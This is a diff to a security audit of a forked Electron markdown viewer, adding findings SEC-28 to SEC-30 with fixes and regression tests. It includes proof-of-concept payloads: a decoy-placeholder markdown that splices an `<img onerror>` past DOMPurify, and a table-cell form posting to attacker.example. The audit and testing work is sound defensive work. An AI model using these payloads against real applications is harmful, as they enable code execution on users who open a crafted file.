@@ -50,6 +50,30 @@ Practically: opening an untrusted markdown file in this application should be tr
 
 **Provenance:** every Critical and High finding is **inherited from upstream** (`OmniCoreST/omnicore-markdown-viewer`) — `git blame` attributes the vulnerable lines in `renderer.js` and `main.js` to upstream authors (`can.kyq61-droid`, `Can Kaya`). The fork-specific files (`custom-tabs.js`, `custom-theme.js`, `custom-language.js`, `custom-collapse.js`, `custom-performance.js`) contain **no injection sinks** — they use `textContent` or static HTML literals. The fork introduces one Low finding (SEC-24, session persistence amplifier). This does not reduce the risk of publishing: publishing the fork publishes the vulnerabilities. *(`custom-language.js` has since been deleted with the interface-language switcher; the statement above describes the tree as audited.)*
 
+> **Wave-2 correction to the provenance claim.** The counts and the "fork introduces one Low
+> finding" statement above are a snapshot of the original audit and are left intact as a
+> historical record. They are no longer accurate. SEC-27 was found later by the error
+> sentinel, and **SEC-28 — a Critical, fork-introduced sanitizer bypass — was introduced by
+> the SEC-26 remediation itself**, i.e. by a fix in this fork rather than inherited from
+> upstream. The lesson is recorded there: a remediation is a code change like any other and
+> needs the same adversarial reading as the code it replaces. **SEC-29** was found in the
+> same wave: a High, *upstream*-inherited bypass in which five table call sites opted out of
+> `SANITIZE_CONFIG` altogether. **SEC-30**, also wave 2 and also fork-introduced, is a High in
+> which a document-authored `<a download>` escaped every navigation guard the app has —
+> because a download is not a navigation.
+>
+> Current totals, counted from the `**Severity:**` line of each finding section rather than
+> carried forward by arithmetic:
+>
+> | Severity | Count |
+> |---|---|
+> | Critical | 8 |
+> | High | 8 |
+> | Medium | 8 |
+> | Low | 4 |
+> | Info | 2 |
+> | **Total** | **30** |
+
 ## Remediation status
 
 Findings are being fixed in the order given under *Remediation order* at the end of this
@@ -60,10 +84,10 @@ document. Everything marked FIXED below is covered by a regression test — in
 
 | Finding | Status | How |
 |---|---|---|
-| SEC-26 | **FIXED** | `renderMarkdownFull` reordered to parse → assemble → sanitize → insert, so DOMPurify is the last step before DOM insertion in *both* render paths. |
+| SEC-26 | **FIXED** | `renderMarkdownFull` reordered to parse → assemble → sanitize → insert, so DOMPurify is the last step before DOM insertion in *both* render paths. **Correction (wave 2):** this row overstated the fix for as long as the data-URI protect/restore dance existed — that dance ran a `String.replace` on the HTML *after* `sanitizeHtml()` in both paths, so sanitize was not actually last. SEC-28 is the residual violation, and the claim above became true only when it was fixed. |
 | SEC-02 | **FIXED** | Mermaid bodies escaped at every interpolation site, and inserted as text rather than markup. |
 | SEC-03 | **FIXED** (feature since removed) | Slider `src`/`alt` escaped before assembly; the slider itself was removed in `8c2`, so the sink is gone. The payload was retained against the ordinary image path. |
-| SEC-04 | **FIXED** | OmniWare DSL and error text escaped before assembly. Mitigated at the pipeline level by sanitize-last; not yet escaped at source in `omniwire/omniware.js`. |
+| SEC-04 | **FIXED** (feature since removed) | OmniWare DSL and error text escaped before assembly, and mitigated at the pipeline level by sanitize-last. The source-level escaping gap noted at the time — `omniwire/omniware.js` interpolating props without calling its own `parseInline()` helper — was never closed at source because the whole OmniWare wireframe renderer was removed from the fork; `src/omniwire/` no longer exists, so the sink is gone rather than guarded. The evidence section below is retained as the record of what a past version did. `test-render-security.js` and `test-popup-security.js` keep removal pins so the renderer cannot return unnoticed. |
 | SEC-01 | **FIXED** (mitigated, feature retained) | `@@@html` frames are pinned to `sandbox="allow-scripts"` with no `allow-same-origin` — enforced both on emission and by a global DOMPurify `afterSanitizeAttributes` hook, so markdown cannot author an un-sandboxed iframe. The frame therefore has an opaque origin and cannot reach `window.parent`. The feature is kept rather than removed. |
 | SEC-23 | **FIXED** | The `postMessage` resize listener now identifies the sender by matching `event.source` against the managed frames instead of trusting an index from the message body, and coerces/clamps the reported height. No attacker-controlled string reaches a selector. |
 | SEC-05 | **FIXED** | Image popup: `alt` escaped for both the `<title>` and the `alt` attribute; `src` passed through a new `safeImageSrc()` that rejects UNC, protocol-relative, remote `file://` and non-image schemes. The `image-popup-save` IPC handler now verifies the sender is the image popup, caps the payload at 64 MB and requires a strict `data:image/(png\|jpeg);base64,…` URL before writing bytes to disk. |
@@ -79,12 +103,18 @@ document. Everything marked FIXED below is covered by a regression test — in
 | SEC-12 | **FIXED** | Local-file links now go through an extension policy applied to the *resolved* path (`realpathSync`, so a symlink is judged by its real target). Executables, script/macro formats and auto-mounting disk images are refused outright; inert documents and media open directly; `.svg`/`.pdf`/`.rtf` and anything unrecognised require an explicit confirmation naming the file. UNC / protocol-relative paths are rejected *before* `fs.existsSync()`, which was itself the network probe. |
 | SEC-16/17/18 | **FIXED** earlier | Dependency upgrades (24 advisories → 0). |
 | SEC-19 | **FIXED** | Release workflow: every action pinned to a commit SHA (+ Dependabot to keep the pins moving), `softprops/action-gh-release` moved off the unmaintained v1, `npm ci` instead of `npm install`, `contents: write` narrowed to the publish job only, `persist-credentials: false` on checkout. Also fixed a defect the audit missed: the workflow pinned Node 18 against `engines.node >= 22.12.0` + `engine-strict=true`, so it could not have built at all. Code signing remains open. |
-| SEC-27 | **FIXED** | OmniWare's hand-drawn fonts were `@import`ed from fonts.googleapis.com and silently refused by the popup CSP, so every wireframe rendered in generic `cursive`. Fonts vendored locally and emitted as `@font-face` by `omniwareFontFaceCss()`. Found by the error sentinel, not by the audit. |
+| SEC-27 | **FIXED** (feature since removed) | OmniWare's hand-drawn fonts were `@import`ed from fonts.googleapis.com and silently refused by the popup CSP, so every wireframe rendered in generic `cursive`. Fixed at the time by vendoring the fonts locally and emitting `@font-face` from `omniwareFontFaceCss()`. Neither that function nor the wireframe feature exists any more, and `scripts/vendor-libs.js` vendors only FiraCode today — so this is history, not a live fix location. Found by the error sentinel, not by the audit. |
 | SEC-20 | **FIXED** | Popup documents were written to a fixed, world-guessable path under the shared temp directory. Now each goes into its own `mkdtempSync` directory (0700) and is created with `flag: "wx"`, so a pre-planted symlink causes an error instead of a redirected write. The same treatment for the portable-update batch script, whose `exec()` with an interpolated path also became `spawn()` with an argv array. Fixing this also fixed a plain functional bug: two popups of the same kind shared one filename, so the second overwrote the first and whichever closed first deleted the other's document. |
 | SEC-21 | **FIXED** (both halves, hardened after review) | `<iframe src>` is stripped in the sanitizer hook (see SEC-11). `style` stays in the allowlist — notes, themes and upstream markdown all need it — so the URLs *inside* CSS are filtered instead: `url()`, `image-set()` and `@import` may name only a relative path, a local drive path or an inert `data:image/…` (SVG excluded). Values are CSS-unescaped before being judged, and remote ones are rewritten to `about:blank`. This matters because `img-src https:` is deliberately open, so the CSP does **not** stop a `background-image` beacon. |
 | SEC-22 | **FIXED** | `exec()` with an interpolated path on the WSL export route became `execFile()` with an argument vector, so no shell ever re-parses the filename. **Caveat: not executed end-to-end** — the branch is `process.platform === "linux"` only and this machine is Windows. Syntax- and review-checked, not run. |
 | SEC-24 | **WON'T FIX** (by design) | Session restore re-opens the previously-open documents on launch. That is the feature the fork exists for, and every injection route it could re-arm (SEC-01..07, SEC-12/13/14, SEC-21, SEC-26) is now closed at the source. Recorded so the trade is explicit rather than overlooked. |
 | SEC-25 | **FIXED** | The no-op `sanitize: false` option is deleted from `marked.setOptions`, with a comment naming DOMPurify as the sole sanitization boundary. Info-severity documentation defect; nothing behavioural changed, so it carries no test. |
+| SEC-28 | **FIXED** | *Critical.* The data-URI protect/restore dance around `sanitizeHtml()` restored stored URIs with `String.replace(<fixed literal>, uri)` — first occurrence only, on a predictable literal — so a document could plant a decoy copy of the placeholder and splice unsanitized markup past DOMPurify into a Node-privileged window. Both blocks deleted; the dance was never needed, because DOMPurify permits `data:` on `<img>` natively via `DATA_URI_TAGS`. Reverts R447/R448. See the SEC-28 entry for the PoC, the second (`$&`) primitive, and the accepted SAFE_FOR_XML trade. |
+| SEC-29 | **FIXED** | *High.* Five table call sites sanitized with a bare `DOMPurify.sanitize()`, silently opting out of `SANITIZE_CONFIG` and therefore out of the SEC-11 `<form>` control — while `SANITIZE_CONFIG` described itself as the "single source of truth for what the sanitizer permits". A `<form>` nested in a table **cell** reached both the live viewer and the table dialog's live preview. Now routed through a new `sanitizeTableHtml()` whose `FORBID_TAGS`/`FORBID_ATTR` are taken from `SANITIZE_CONFIG` by reference (and frozen, since DOMPurify's `addToSet` writes lower-cased entries back into the caller's array). Reverts R449 (the bypass) and R450 (the aliasing). |
+
+| SEC-30 | **FIXED** | *High.* `<a download>` in document content was an outbound-request primitive: `download` is in DOMPurify's default `ALLOWED_ATTR`, a download is not a navigation (so `will-navigate` never saw it), CSP has no directive for downloads, and `#tableInsertPreview` sits outside `#viewer` so the click delegation did not run there. Measured issuing a live loopback HTTP request from the privileged renderer. Fixed in three layers: `download` added to the shared `FORBID_ATTR` (prevents the request), a capture-phase click guard making the dialog preview inert, and a `will-download` deny on `defaultSession` allowing only `blob:` — which is what the app's own Tabulator CSV/JSON export uses, measured, so a blanket deny would have broken it. |
+
+| SEC-31 | **FIXED** | *High.* Column **titles** in the table pop-out reached three separate `innerHTML` sinks in the vendored Tabulator 6.5.2 completely unescaped, from the same document-controlled markdown whose **cells** are escaped. Cells default to the `plaintext` formatter (`sanitizeHTML`); titles have no equivalent default — `formatHeader` returns the title unchanged and `_formatColumnHeaderTitle` assigns it with `el.innerHTML`. The popup CSP is only a *partial* control here: `script-src 'nonce-…'` stops the injected handler, but `style-src 'unsafe-inline'` does not stop an injected `<style>`, measured applying a `rgb(1,2,3)` outline. A `titleFormatter` default was the obvious fix and was **rejected after measurement**: it reaches only the header. `generateCollapsedRowData` copies `definition.title` **raw, pre-formatter** into the responsive-collapse panel, and `headerTooltip: true` — a bare boolean carrying no markup — makes `loadTooltip` run `innerHTML` on the raw title, so no value-scrubbing fix can close it. It was also bypassable by *shape*: `mapDefinitions` fills only `undefined` keys, so a per-column `titleFormatter: null`/`""`/`"html"` defeated the default, and `formatters.html` is literally `return e.getValue()`. Fixed at the IPC boundary instead: `normaliseTablePayload()` emits a **fresh allow-listed** column object holding HTML-**escaped** text in `title` and the **raw** text in `titleDownload`, so every reader reachable under that shape is closed by construction (they all assign through `innerHTML`, which renders the escaped bytes back as the original characters) while CSV exports stay faithful to the document. Rows are rebuilt key-by-key and re-keyed by index, which also removes prototype-shaped keys and `.`-separated nested-field lookups. Reverts R503 (the escaping), R504 (the allow-list), R506 (the `titleDownload` premise) — and R505, which restores the *oracle's* own earlier bug. |
 
 ### Why the popup CSP is the primary control, not defence in depth
 
@@ -1538,6 +1568,401 @@ Worth recording separately because it is the single root cause behind SEC-02, SE
 * **Light-format render** (`renderLightFormat`): mermaid splicing at `2996` and iframe splicing at `3016`, **then** `DOMPurify.sanitize` at `3028`, then `patchViewerDOM` at `3039`. → mostly safe (the `srcdoc` attribute is stripped, so `@@@html` renders as an empty iframe)
 
 The correct ordering already exists in the codebase; it is simply not used on the path that matters. Any fix should converge both paths on *parse → assemble → sanitize → insert*.
+
+---
+
+## SEC-28 — Data-URI restore splices unsanitized markup past DOMPurify *(wave 2; fork-introduced by the SEC-26 remediation)*
+
+**Severity: Critical** · Confidence 10/10 · Fork-introduced · **FIXED**
+
+**Location:** `renderMarkdownFull` and `renderLightFormat`, `src/renderer.js` (both blocks now deleted)
+
+The residual half of SEC-26. After that finding reordered the pipeline to *sanitize last*,
+both render paths still carried a protect/restore dance **wrapped around** the sanitizer:
+
+```js
+const dataUriStore = [];
+// 1. swap every <img src="data:image/…"> for a fixed placeholder
+html = html.replace(/<img([^>]*?)src\s*=\s*"(data:image\/[^"]+)"([^>]*?)>/gi, (m, before, dataUri, after) => {
+  const idx = dataUriStore.length;
+  dataUriStore.push(dataUri);
+  return `<img${before}src="https://data-uri-placeholder.local/${idx}"${after}>`;
+});
+// 2. sanitize
+html = sanitizeHtml(html);
+// 3. put the real URIs back — THE BUG
+dataUriStore.forEach((uri, idx) => {
+  html = html.replace(`https://data-uri-placeholder.local/${idx}`, uri);
+});
+// 4. patchViewerDOM(html) → innerHTML
+```
+
+Step 3 is the bug. `String.prototype.replace` with a **string** search value rewrites only
+the **first** occurrence, and the literal is entirely predictable. A document can plant a
+decoy copy of it *earlier* in the output — a code span is enough — so the restore consumes
+the decoy and splices the raw, never-sanitized `data:` URI into a **text** position, which
+`innerHTML` then parses as markup.
+
+So sanitize was never actually last, and the SEC-26 row claiming it was had been overstated
+since the day it was written. The deleted code's own comment asserted *"nothing can be
+spliced in behind the sanitizer's back"*.
+
+**Proof of concept** (now the shipped test fixture):
+
+```markdown
+# Doc
+
+`https://data-uri-placeholder.local/0`
+
+<img src="data:image/svg+xml,<img src=x onerror=window.__pwned='sec28'>">
+```
+
+**Measured** in a real Chromium DOM against the actually-vendored `marked.min.js` +
+`purify.min.js` (DOMPurify 3.4.12): final DOM contains `img[0] onerror="ATTACKMARKER()"
+src="x"`. Under the reverts the assertions report
+`{"sec28Pwned":"sec28","onerror":1,"srcX":1,"dataImg":0}` on the full path and the same on
+light-format.
+
+**Impact.** The main window runs `nodeIntegration: true, contextIsolation: false`
+(`src/main.js:496-497`) and its CSP allows `script-src 'self' 'unsafe-inline'` (the
+concession `@@@html` forces, see SEC-09), so `require` is in scope for injected script.
+Opening a markdown file is therefore sufficient for arbitrary code execution. Both render
+paths were affected, including the light-format path a plain text edit takes — which had
+**no** security coverage at all before this fix.
+
+**Second primitive.** The stored URI is passed as the *replacement* string, so
+`$&`, `` $` ``, `$'` and `$1` are live inside it. Measured:
+`restored: AAA<p>SECRETTAIL</p>data:image/png;base64,X ZZZ ZZZ` — sanitized content
+relocated into the output with no decoy required.
+
+**Fix.** Both blocks deleted outright. The dance was never needed *for the reason its
+comment gave* ("DOMPurify strips `data:` URIs by default"): that is true for `href`, but
+DOMPurify permits `data:` on `<img>` natively via `DATA_URI_TAGS`. Verified by measurement
+against the vendored build, not inferred from documentation.
+
+**Accepted behaviour change (SAFE_FOR_XML).** The dance was, by accident, doing one real
+thing: swapping the URI out *before* the parse meant DOMPurify's `SAFE_FOR_XML` filter never
+judged the payload. That filter is on by default, is not overridden by `SANITIZE_CONFIG`,
+drops any attribute matching
+`/((--!?|])>)|<\/(style|script|title|xmp|textarea|noscript|iframe|noembed|noframes)/i`,
+and runs **before** `forceKeepAttr`, so no sanitizer hook can rescue it. Measured
+consequence of the deletion:
+
+| data-URI form | `src` after sanitize |
+|---|---|
+| raw `data:image/svg+xml,<svg><style>…</style></svg>` | **dropped** |
+| entity-encoded `…&lt;/style&gt;…` | **dropped** |
+| DTD internal subset `…[ <!ENTITY …> ]>…` | **dropped** |
+| `data:image/svg+xml;base64,…` | preserved |
+| `data:image/png;base64,…` | preserved |
+
+This is accepted deliberately: the markup the dance protected is indistinguishable from the
+markup it exfiltrated. `file://` and local drive paths are unaffected — the protect regex
+only ever matched `data:image/`. The trade is pinned by the test named below, and the
+reverts confirm it independently (restoring the full path's dance moves `withSrc` from 1
+back to 4).
+
+**Regression tests** (`npm run test:security`):
+
+* `SEC-28 a decoy placeholder cannot splice markup past the sanitizer (full path)`
+* `SEC-28 a decoy placeholder cannot splice markup past the sanitizer (light-format path)`
+* `FEATURE data-URI images survive the sanitize step (light-format path)`
+* `FEATURE base64 data-image survives SAFE_FOR_XML where raw/entity/DTD forms do not`
+
+Each carries a positive control (`renderError === null`, plus a presence assertion) because
+all three attack oracles are absence checks and would otherwise report green on a render
+that threw or produced nothing.
+
+**Reverts:** R447 (full path), R448 (light-format path).
+
+---
+
+## SEC-29 — Table paths sanitized with a bare `DOMPurify.sanitize()`, bypassing the `<form>` control *(wave 2)*
+
+**Severity: High** · Confidence 10/10 · Upstream (the table feature) · **FIXED**
+
+**Location:** five call sites in `src/renderer.js` — `renderTableInDOM`, `updateTablePreview`, `openTableInsertDialog` (edit path), `insertTableFromDialog` (validation), and the table-update preview
+
+SEC-11 closed off `<form>`-driven navigation of the Node-privileged main window by putting
+`FORBID_TAGS: ['form']` into `SANITIZE_CONFIG`. The comment above that object called it the
+*"single source of truth for what the sanitizer permits, so the two render paths cannot
+drift apart again."*
+
+It was not. Five call sites parsed and sanitized markdown as
+`DOMPurify.sanitize(marked.parse(md))` — **no config** — and so were strictly weaker than
+the document pipeline. Measured difference on the same input:
+
+```
+sanitizeHtml (with SANITIZE_CONFIG): <button>View</button>
+bare DOMPurify.sanitize()          : <form action="https://attacker.example/pwn.html"><button>View</button></form>
+```
+
+The global `addHook` registrations still applied — hooks are per-instance, not per-call — so
+image handling remained correct at these sites and only the *config* was missing. That is
+almost certainly why it went unnoticed for so long: the paths looked and behaved right.
+
+**Reachability (measured, and narrower than it first appears).** `renderTableInDOM` extracts
+only the `<table>` element from its scratch div:
+
+```js
+tempDiv.innerHTML = html;
+const tableEl = tempDiv.querySelector('table');
+```
+
+so a `<form>` that is a **sibling** of the table is discarded by the extraction and never
+reaches the document. Nested inside a table **cell**, however, it travels with the table and
+is appended straight into `#viewer`. Two sinks were confirmed:
+
+* the live viewer, via the context-menu insert/edit table path;
+* `tableInsertPreview`, a live element in the same privileged window — and its `'edit'` path
+  is fed from a table in the **open document**, so its input is attacker-controlled too.
+
+Reproduced with:
+
+```markdown
+| A | B |
+|---|---|
+| <form action="https://probe.invalid/tbl"><button>TableFormProbe</button></form> | y |
+```
+
+Under the revert the two assertions report different shapes, quoted here verbatim rather than
+summarised — each probe measures its own surface:
+
+```
+context-menu table path:
+  {"tables":1,"forms":1,"actionAttrs":1,"probeBtn":true}
+table dialog preview:
+  {"found":true,"tables":1,"cellBtns":1,"forms":1,"actionAttrs":1,"probeBtn":true,
+   "residualForms":0,"residualBtn":false}
+```
+
+Both show a live `<form action>` in the privileged window. `probeBtn` proves the payload
+reached the sanitizer rather than the render having failed, and `tables`/`cellBtns` are
+positive controls: without them an assertion that stopped emitting a `<table>` at all would
+read green while measuring a different shape.
+
+**Fix.** A new `sanitizeTableHtml()` backed by `TABLE_SANITIZE_CONFIG`, which takes
+`FORBID_TAGS` and `FORBID_ATTR` from `SANITIZE_CONFIG` **by reference**, so a tag added there
+can never leave this path behind again.
+
+Deliberately *not* `sanitizeHtml()`. That config serves the document pipeline and genuinely
+widens DOMPurify's defaults with `<iframe>`, `srcdoc` and `target`; the global
+`afterSanitizeAttributes` hook force-sandboxes every iframe with `allow-scripts`, so reusing
+it would have newly handed attacker-controlled markdown a script-running frame in a preview
+that cannot have one today.
+
+*(`<style>`, `class`, `id` and `style` are **not** part of that widening — they are DOMPurify
+defaults. An earlier draft of this section claimed otherwise; the allow-lists were then read
+out of the vendored `libs/vendor/purify.min.js` (3.4.12) directly, and the claim was wrong.)*
+
+Everything other than the two forbid-lists stays on DOMPurify's defaults — exactly what these
+sites already had. The behavioural delta is therefore **two** changes, not one:
+
+* `<form>` is unwrapped. Its children survive, because `form` is not in DOMPurify's
+  `DEFAULT_FORBID_CONTENTS` — which is what makes the `probeBtn` control above sound.
+* `action` is dropped from **every** element, not just from `<form>`. DOMPurify's attribute
+  allow-list is global rather than per-tag (`FORBID_ATTR` is consulted before any tag
+  context), and `action` is default-allowed, so `FORBID_ATTR: ['action']` narrows these sites
+  slightly beyond the bare defaults they had before.
+
+That second delta is **kept rather than trimmed**, deliberately. An `action` attribute on a
+non-form element is inert HTML, so the cost is nothing; and holding the two deny-lists
+byte-identical *by reference* is the entire mechanism behind the promise that a tag added to
+`SANITIZE_CONFIG` can never leave this path behind. Trimming `FORBID_ATTR` to make the config
+literally zero-narrowing would trade that forward-defence for a meaningless attribute.
+
+**Regression tests** (`npm run test:security`), the first two with the SEC-11 unwrap control:
+
+* `SEC-29 a <form> nested in a table cell is stripped on the context-menu table path`
+* `SEC-29 a <form> nested in a table cell is stripped in the table dialog preview`
+* `SEC-29 the table dialog is left reset, not holding the attack markdown`
+* `SEC-29 the table config shares SANITIZE_CONFIG's deny-lists by reference, frozen`
+
+The last one uses **object identity** as its oracle
+(`SANITIZE_CONFIG.FORBID_TAGS === TABLE_SANITIZE_CONFIG.FORBID_TAGS`), because the sharing is
+the fix's whole load-bearing property and no behavioural test can see it: swap the aliases for
+literal copies with the same contents and every other assertion here stays green.
+
+**Reverts:** R449 perturbs the shared helper so one edit reproduces the flaw at all five
+sites. `SEC-11 …` is listed as `mustPass`, pinning the asymmetry: reverting the table path
+must not disturb the document path. R450 covers the aliasing separately — it gives the table
+config literal copies of both deny-lists, and fails **only** the identity assertion, with
+`SEC-11` and both SEC-29 strip assertions in `mustPass` precisely to record that the drift is
+invisible to all of them.
+
+---
+
+## SEC-30 — `<a download>` is an outbound-request primitive from document content
+
+**Severity: High.** Found in wave 2, while checking whether the table dialog's preview was
+covered by the viewer's click delegation. It is not — and the gap turned out to be a security
+hole rather than the functional nit it looked like.
+
+**Inherited or introduced?** Introduced by this fork. The table insert/edit dialog and its
+live preview do not exist upstream.
+
+**The finding.** DOMPurify 3.4.12 allows `download` by default — measured directly from the
+vendored minified build by extracting its default `ALLOWED_ATTR` (118 entries: `href`,
+`action` and `download` present; `target`, `ping`, `srcdoc` and `formaction` absent). A
+document could therefore author `<a download href="https://attacker/...">`, and clicking it
+in the table dialog's preview issued a **live outbound HTTP request** from the
+Node-privileged renderer and dropped the response on disk.
+
+It bypassed every existing control simultaneously, and each for a different reason:
+
+| Control | Why it did not apply |
+|---|---|
+| Viewer click delegation (`renderer.js`, external-link routing / SEC-12) | `#tableInsertPreview` (`index.html:1682`) sits **outside** `#viewer`, so the delegation never runs for it. |
+| `will-navigate` / `will-redirect` / `will-frame-navigate` / `setWindowOpenHandler` (`main.js`) | **A download is not a navigation.** These fire for navigations only. |
+| CSP `connect-src 'none'` | CSP has **no directive that governs downloads**. `navigate-to` was proposed and dropped, and would not have covered this anyway. |
+| `@@@html` iframe sandbox | Not a factor: those frames are pinned to `sandbox="allow-scripts"` with no `allow-downloads`, so they cannot initiate one. Checked, not assumed. |
+
+**Reachability is real.** The dialog's `edit` path is fed from the **open document**
+(`ctxEditTable` → `openTableInsertDialog(md, 'edit')`), so its input is attacker-controlled.
+Cost to the attacker: the user right-clicks a table, chooses Edit Table, and clicks a link in
+the preview. That interaction requirement is why this is High rather than Critical.
+
+**Measured, before the fix.** A probe booted the real app, rendered two anchors into the
+preview — one with `download`, one plain — clicked both, and pointed them at a loopback HTTP
+server acting as the oracle:
+
+```
+Blocked main-window navigation to: http://127.0.0.1:63749/PREVIEW-NAV
+PREVIEW {"anchors":2,"downloadSurvived":true,"insideViewer":false}
+after preview leg -> hits=["/PREVIEW-DOWNLOAD"]
+after preview leg -> downloads=["http://127.0.0.1:63749/PREVIEW-DOWNLOAD"]
+VIEWER  {"anchors":2,"downloadSurvived":true}
+after viewer leg  -> hits=["/PREVIEW-DOWNLOAD"]      (unchanged - no new hit)
+after viewer leg  -> openExternal=[".../PREVIEW-DOWNLOAD",".../PREVIEW-NAV"]
+```
+
+The plain anchor is the positive control: it was blocked, which proves the click dispatch
+worked and that "no hit" would have been a real result rather than a broken probe. The viewer
+leg shows the same two anchors producing **no** network hit, because every branch of the
+click delegation calls `preventDefault()` and routes the link to `shell.openExternal` — the
+attribute was already inert inside `#viewer`.
+
+**The fix — three layers, each with a different job.** They are not redundant, and the
+distinction matters for reading the reverts:
+
+1. **`renderer.js` — `download` added to the shared frozen `FORBID_ATTR`.** This is the layer
+   that prevents the **request**. With the attribute gone the anchor degrades to an ordinary
+   link, which `will-navigate` then denies *before* anything leaves the machine. The table
+   path inherits this automatically because `TABLE_SANITIZE_CONFIG` aliases the deny-lists by
+   reference — exactly the property SEC-29's identity assertion was written to pin.
+2. **`renderer.js` — a capture-phase click guard on `#tableInsertPreview`.** A preview is not
+   an interactive surface; this makes it inert rather than leaving it the one clickable
+   region in the app with no policy attached. Implemented in **JS, not CSS**, deliberately:
+   `style` is in DOMPurify's *default* `ALLOWED_ATTR`, which `TABLE_SANITIZE_CONFIG` keeps,
+   so document content can carry an inline style; an inline `!important` declaration outranks
+   an author stylesheet's `!important` (same origin, inline wins on specificity), and
+   `pointer-events` is inherited, so a descendant could re-enable itself. A capture listener
+   cannot be outranked by anything a document can express. It calls `preventDefault()` only —
+   no `stopPropagation()`, which would silently change behaviour for ancestor handlers — and
+   is unconditional rather than matched against `a, area`, because an image map's click target
+   is the `<img>`, not the `<area>`. Registered for **`auxclick` as well as `click`**:
+   Chromium has fired `auxclick` for non-primary buttons since Chrome 55, so a middle-click
+   would otherwise skip the guard entirely and reach the default open-in-new-window path
+   (contained by `setWindowOpenHandler`, but by a different layer than this one claims to be).
+   Scope stated honestly: this covers activation, not every gesture — a link can still be
+   *dragged* out of the preview, which is an explicit user action outside the window, and
+   suppressing `dragstart` would also break selecting text out of the preview.
+3. **`main.js` — `will-download` denied on `session.defaultSession`.** Defence in depth for
+   any download the sanitizer cannot see. Its honest scope is narrower than it looks:
+   `will-download` fires only once a response has **begun**, so it stops the file drop, not
+   the request. Measured: a DOM-injected download anchor still reached the server
+   (`hits=["/DIRECT"]`) while the guard cancelled the download.
+
+**Why the allow-list is `blob:` only, and why a blanket deny would have been a regression.**
+The app has exactly one legitimate download — Tabulator's table export (`exportCSV` /
+`exportJSON` → `table.download(...)`), which works by synthesising an `<a download>` and
+clicking it. Measured at the `will-download` boundary rather than assumed:
+
+```
+{"url":"blob:file:///6ebb68e1-51ec-4e8b-9572-116dea3fdbf9",
+ "filename":"table-export.csv","mime":"text/csv","initiator":"blob:file:///6ebb68e1-..."}
+```
+
+A `blob:` URL with no network, cleanly separable from the `http:` attack. A blanket
+`will-download` deny — the obvious first fix — would have silently broken CSV/JSON export.
+`data:` needs no allowance either, because DOMPurify's default `ALLOWED_URI_REGEXP` does not
+admit `data:` on an `<a href>` (only for `DATA_URI_TAGS` — audio/video/img/source/image/track),
+so `<a download href="data:…">` loses its `href` regardless.
+
+**Who can mint a `blob:` URL — stated precisely, because the obvious claim is wrong.** It is
+*not* true that document content cannot mint one: an `@@@html` block runs attacker-authored
+script, and that script can call `URL.createObjectURL`. What it cannot do is **download** one.
+Those frames are pinned to `sandbox="allow-scripts"` with no `allow-downloads`, and Chromium
+blocks downloads in a sandboxed frame lacking that token; their opaque origin also means a
+blob they mint is not loadable by the top frame, which itself runs no document-authored
+script. The allow-list is therefore **scheme-only, and its safety depends on that sandbox
+never gaining `allow-downloads`** — recorded here because nothing else would catch it.
+`electron-updater` also downloads, but over its own HTTP stack on a separate partition rather
+than a `webContents` session, so it never reaches this handler.
+
+`defaultSession` is the complete surface: `main.js` creates **no partitions** and passes no
+custom session to any of its four `BrowserWindow` sites, so one handler covers the main
+window, all three popups and anything added later. It is registered once at `app.whenReady()`
+rather than inside `createWindow()`, so a second `createWindow()` (macOS `activate`) cannot
+stack duplicate listeners.
+
+**Regression tests.** Three in `npm run test:security`, each with a positive control:
+
+* `SEC-30 the download attribute is stripped from document content in the viewer`
+* `SEC-30 the download attribute is stripped in the table dialog preview`
+* `SEC-30 clicks in the table dialog preview are inert`
+
+The first two assert the anchor **and its `href` survive** — without that, a marked or
+DOMPurify change that stopped emitting the `<a>` at all would report zero `download`
+attributes and read green while measuring nothing. The third dispatches a real click and
+observes `defaultPrevented` from a bubble-phase listener; its `clickSeen` flag is the control,
+proving the click was actually dispatched so the result cannot pass by nothing happening.
+
+Two more in `npm run test:popups`, covering the main-process layer:
+
+* `SEC-30 the download policy admits the app's blob: exports and nothing else`
+* `SEC-30 the download policy is wired to the default session`
+
+These are deliberately **two** assertions against a policy split out of the listener into an
+exported `isDownloadAllowed(url)`. Proving the listener end-to-end would need a real
+responding server — `will-download` never fires for the unresolvable `.invalid` hosts these
+suites use by design — so the rule is asserted directly instead, including that it is a
+**prefix** test (`https://…/blob:file:///x` must be denied) and that a non-string cannot slip
+through. Either assertion alone fails open: a listener that merely exists tells you nothing
+about whether its policy is right, and a correct policy nothing calls protects nothing.
+
+The suite's two pre-existing table-export FEATURE checks were also **strengthened**, because
+review showed they could not detect this fix breaking them. They asserted only that
+`will-download` *fired* with a `.csv`/`.json` filename — but `will-download` fires for a
+*denied* download too, since that is the point at which it is denied, so both would have
+passed on a build where the guard cancelled the export. They now run each item through to
+`state === 'completed'` against a temp save path:
+
+* `FEATURE table popup CSV export completes, so SEC-30's guard admits it`
+* `FEATURE table popup JSON export completes, so SEC-30's guard admits it`
+
+**Reverts:** R451 drops `download` from the deny-list, restoring the shipped state and failing
+all three renderer assertions — including SEC-29's identity check, which reads the list's
+contents and so names the drift too. The preview click guard is in `mustPass`, recording that
+the two are separate controls rather than one wearing two names. R452 makes the click guard a
+no-op while leaving the listener registered, so it can only be caught by observing
+`defaultPrevented` on a real click, never by counting listeners. R453 and R454 are a
+complementary pair on the main-process layer: R453 opens the policy wide with the wiring
+intact, R454 leaves the policy correct and unhooks it. Each lists the other's assertion in
+`mustPass`, which is what demonstrates neither check subsumes the other. **R455** denies
+everything — the blanket deny that was the tempting first fix — and is the revert that
+justifies the "completes" assertions existing: the two "still starts a download" checks are
+in its `mustPass` and **keep passing**, so only the completion checks catch it.
+
+Two *existing* reverts had to be amended, because adding an entry to a shared deny-list
+changes what they destroy. **R449** (table paths back to a bare `DOMPurify.sanitize()`) drops
+`FORBID_ATTR` wholesale, so it now breaks three assertions rather than two; the SEC-30 preview
+check is listed in its `expect` because it is the same finding — one config omission, three
+controls lost — not collateral. **R450** (literal copies of the deny-lists instead of the
+shared references) had its replacement text updated to include `download`; without that it
+would have silently stripped the SEC-30 guard as well, contradicting its own central claim
+that it is *behaviourally inert* and producing an unlisted failure. Both were re-run and
+report the corrected counts.
 
 ---
 
